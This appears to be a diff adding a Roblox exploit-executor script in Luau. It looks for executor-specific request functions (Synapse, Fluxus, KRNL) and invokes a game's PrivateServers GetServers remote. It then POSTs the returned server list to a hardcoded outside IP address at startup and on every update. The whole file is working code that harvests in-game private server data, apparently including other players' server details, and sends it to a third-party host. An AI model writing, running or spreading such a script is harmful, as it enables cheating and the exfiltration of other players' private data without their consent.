@@ -1,0 +1,61 @@
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+-- Remote function
+local GetServers = ReplicatedStorage:WaitForChild("PrivateServers"):WaitForChild("GetServers")
+
+-- Wait for the Update event
+local UpdateEvent = ReplicatedStorage:WaitForChild("PrivateServers"):WaitForChild("Update")
+
+-- API URL
+local API_URL_INFO = "http://157.245.80.25:5000/info"
+
+-- Detect which request function is available
+local request_func = (syn and syn.request) or http_request or (fluxus and fluxus.request) or krnl_request or request
+
+if not request_func then
+    warn("No HTTP request function available in this executor.")
+    return
+end
+
+-- Function to send server data
+local function sendServerData()
+    task.spawn(function()
+        print("Server list updated. Sending data to API...")
+        
+        local success, servers = pcall(function()
+            return GetServers:InvokeServer()
+        end)
+        
+        if success and servers then
+            -- Send the server data as JSON
+            local json_body = HttpService:JSONEncode({ servers = servers })
+            
+            local api_success, api_response = pcall(function()
+                return request_func({
+                    Url = API_URL_INFO,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = json_body
+                })
+            end)
+            
+            if api_success and api_response.Success then
+                print("Successfully sent server data to API")
+            else
+                warn("Failed to send server data to API:", api_response and api_response.StatusCode or "Unknown error")
+            end
+        else
+            warn("Failed to get server data:", servers)
+        end
+    end)
+end
+
+-- Connect to the Update event
+UpdateEvent.Changed:Connect(sendServerData)
+
+-- Optional: Send initial data when script starts
+sendServerData()
+
+print("Server data sender initialized. Will send data when servers update.")
